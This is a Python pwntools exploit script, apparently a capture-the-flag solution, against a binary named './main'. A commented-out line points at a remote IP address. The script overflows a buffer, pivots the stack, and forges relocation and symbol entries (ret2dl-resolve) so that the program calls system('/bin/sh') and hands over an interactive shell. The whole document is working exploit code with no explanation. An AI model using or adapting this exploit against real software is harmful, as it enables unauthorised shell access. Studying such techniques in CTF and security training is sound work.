from pwn import*
p = process('./main')
rop = ROP('./main')
elf = ELF('./main')
#p = remote('47.103.214.163',20700)
plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

base_stage = 0x804A060 + 0x400
leave_ret = 0x08048458
payload = 'U'*0x44 + p32(base_stage - 4) + p32(elf.plt['read']) + p32(leave_ret) + p32(0) + p32(base_stage) + p32(0x100)
p.sendlineafter('LEVEL5?',payload)

#--------
fake_sym_addr = base_stage + 24 #fake_sym
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf) #alignment
fake_sym_addr = fake_sym_addr + align # 
index_dynsym = (fake_sym_addr - dynsym) / 0x10
st_name = fake_sym_addr + 0x10 - dynstr #system
fake_read_sym = flat([st_name, 0, 0, 0x12])

index_offset = base_stage + 16 - rel_plt
read_got = elf.got['read']
r_info = (index_dynsym << 8) | 0x7 
fake_read_reloc = flat([read_got, r_info])

link_map  = p32(plt0)
link_map += p32(index_offset)
link_map += 'UUUU'
link_map += p32(base_stage + 80) # binsh
link_map += fake_read_reloc
link_map += 'U'*align
link_map += fake_read_sym
link_map += 'system\x00'
link_map += 'U' * (80 -len(link_map))
link_map += '/bin/sh\x00'
link_map += 'U'*(100 - len(link_map))
p.sendline(link_map)
p.interactive()
